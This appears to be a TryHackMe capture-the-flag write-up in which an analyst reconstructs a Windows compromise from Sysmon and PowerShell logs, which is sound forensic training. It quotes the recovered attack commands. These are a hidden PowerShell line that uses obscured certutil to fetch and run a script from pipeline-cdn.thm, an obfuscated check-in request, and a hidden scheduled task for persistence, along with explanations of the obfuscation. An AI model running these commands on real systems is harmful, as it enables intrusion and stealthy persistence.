# Handbook for the Recently Compromised
### Scenario

A Windows workstation was flagged for unusual activity. The investigation required examining its event logs, identifying suspicious actions, and reconstructing how the host was compromised.

Sysmon provided process execution details, while the PowerShell log exposed script content associated with the intrusion.

| Field | Details |
|---|---|
| Platform | TryHackMe |
| Difficulty | Easy |
| Category | Windows Forensics / Log Analysis |
| Evidence | Sysmon and PowerShell event logs (`.evtx`) |
| Tools | evtx_dump |
| Author | dmncdcco |

## Preparing the Logs

The supplied EVTX files were converted into JSONL for command-line analysis:

```bash
../tools/evtx_dump -o jsonl -f sysmon.jsonl 'Microsoft-Windows-Sysmon%4Operational.evtx'
```

```bash
../tools/evtx_dump -o jsonl -f powershell.jsonl 'PowerShell-Operational.evtx'
```

JSONL stores each event on a separate line, allowing matching events to be selected with `grep` and formatted with `jq`.

## Investigation

### Question 1

- A trusted Windows utility downloaded a second-stage script onto the host. The command that called the utility obscured its name with a wildcard. What is the utility’s full executable name?

- **Answer:** `certutil.exe`

The Sysmon JSONL output was searched for records containing both an HTTP reference and a literal wildcard character:

```bash
grep -niE 'http|https' sysmon.jsonl | grep -F '*'
```

The results included a process creation event with the following PowerShell command:

```powershell
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -nop -w hidden -c "& ((gci C:\Windows\System32\certu*.exe)[0].FullName) -urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 $env:TEMP\pipeline-sync.ps1; powershell -ep bypass -f $env:TEMP\pipeline-sync.ps1"
```

The executable name was obscured through this expression:

```powershell
& ((gci C:\Windows\System32\certu*.exe)[0].FullName)
```

`gci`, an alias for `Get-ChildItem`, searches for executables matching `certu*.exe`. `[0].FullName` retrieves the full path of the first match, and the call operator `&` executes it. The remaining arguments instruct the utility to download `pipeline-sync.ps1` into the user’s temporary directory.

### Question 2

- What full URL did the utility retrieve the second-stage script from?

- **Answer:** `http://pipeline-cdn.thm:8088/pipeline-sync.ps1`

The command identified in the previous question contained the download URL immediately after the `-urlcache -f` arguments:

```text
-urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 $env:TEMP\pipeline-sync.ps1
```

The source URL points to `pipeline-sync.ps1`, which the command saves into the user’s temporary directory.

### Question 3

- Which MITRE ATT&CK sub-technique describes the abuse of the Windows scripting host that executed the initial attachment?

- **Answer:** `T1218.005`

The grep output from Question 1 also showed `mshta.exe` as the parent of the PowerShell process. The relevant parent process fields identified the HTA attachment:

```text
ParentImage: C:\Windows\SysWOW64\mshta.exe
ParentCommandLine (excerpt): "C:\Windows\SysWOW64\mshta.exe" "C:\Users\j.collins\Downloads\pipeline-check.hta"
```

The use of `mshta.exe` to execute the HTA attachment maps to **T1218.005 — Mshta**.

### Question 4

- Which MITRE ATT&CK sub-technique describes the persistence mechanism the intruder configured?

- **Answer:** `T1053.005`

The PowerShell log was searched for scheduled task commands:

```bash
grep -i 'schtasks' powershell.jsonl | jq | less
```

The matching event contained the following `EventData`:

```json
{
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "try { Invoke-WebRequest -Uri (-join('htt','p://pip','el','ine','-cdn.th','m:','808','8/check','in')) -UseBasicParsing -TimeoutSec 3 | Out-Null } catch {}\nschtasks /create /tn ('S'+'tu'+'dioPi'+'pe'+'li'+'neSyn'+'c') /tr (-join('pow','e','rshe','l','l -nop',' -','w hi','dden -','f C:\\U','se','rs\\j','.','collins','\\AppDat','a\\Roamin','g\\Pipeli','neSyn','c\\','pi','pelin','e-sync','.p','s','1')) /sc onlogon /rl highest /f\n$blob = ('VEhNe3R'+'IM19Ha'+'D'+'BzdF93MX'+'RIX1Ro'+'M19'+'NMDVUfQ='+'=')\n$flag = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($blob))\n$dir = ($env:TEMP + ('\\Pipe'+'lineS'+'ync'))\nNew-Item $dir -ItemType Directory -Force | Out-Null\nSet-Content ($dir + ('\\.sy'+'nc-c'+'ach'+'e')) $flag\r\n",
    "ScriptBlockId": "2b2a68a0-ea6a-43f8-b971-4b2db58eeff6",
    "Path": "C:\\Users\\j.collins\\AppData\\Local\\Temp\\pipeline-sync.ps1"
  }
}
```

Within `ScriptBlockText`, the task name and execution command were obscured through string fragmentation:

```powershell
schtasks /create /tn ('S'+'tu'+'dioPi'+'pe'+'li'+'neSyn'+'c') /tr (-join('pow','e','rshe','l','l -nop',' -','w hi','dden -','f C:\U','se','rs\j','.','collins','\AppDat','a\Roamin','g\Pipeli','neSyn','c\','pi','pelin','e-sync','.p','s','1')) /sc onlogon /rl highest /f
```

Joining those fragments revealed:

```powershell
schtasks /create /tn StudioPipelineSync /tr "powershell -nop -w hidden -f C:\Users\j.collins\AppData\Roaming\PipelineSync\pipeline-sync.ps1" /sc onlogon /rl highest /f
```

The command creates a task named `StudioPipelineSync` to run the script through hidden PowerShell at logon (`/sc onlogon`), requesting the highest available privileges (`/rl highest`). This persistence mechanism maps to **T1053.005 — Scheduled Task/Job: Scheduled Task**.

### Question 5

- What is the flag?

- **Answer:** `THM{REDACTED}`

The same PowerShell output examined in Question 4 contained a fragmented Base64 string and its decoding logic:

```powershell
$blob = ('VEhNe3R'+'IM19Ha'+'D'+'BzdF93MX'+'RIX1Ro'+'M19'+'NMDVUfQ='+'=')
$flag = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($blob))
```

The fragments were joined and decoded in the terminal:

```bash
printf '%s' 'VEhNe3RIM19HaDBzdF93MXRIX1RoM19NMDVUfQ==' | base64 -d
```

The decoded output revealed the flag:

```text
THM{REDACTED}
```

The remaining script instructions also showed that the decoded flag was written to `.sync-cache` under `%TEMP%\PipelineSync`:

```powershell
$dir = ($env:TEMP + ('\Pipe'+'lineS'+'ync'))
New-Item $dir -ItemType Directory -Force | Out-Null
Set-Content ($dir + ('\.sy'+'nc-c'+'ach'+'e')) $flag
```

## Findings

The initial HTA launched PowerShell through `mshta.exe`. A wildcard expression invoked `certutil.exe` to download the second-stage script. The PowerShell log exposed a logon scheduled task and the Base64-encoded flag.

| Indicator | Value |
|---|---|
| Download URL | `http://pipeline-cdn.thm:8088/pipeline-sync.ps1` |
| Initial attachment | `pipeline-check.hta` |
| Scheduled task | `StudioPipelineSync` |

---

*This write-up is intended for educational purposes and authorized security research.*
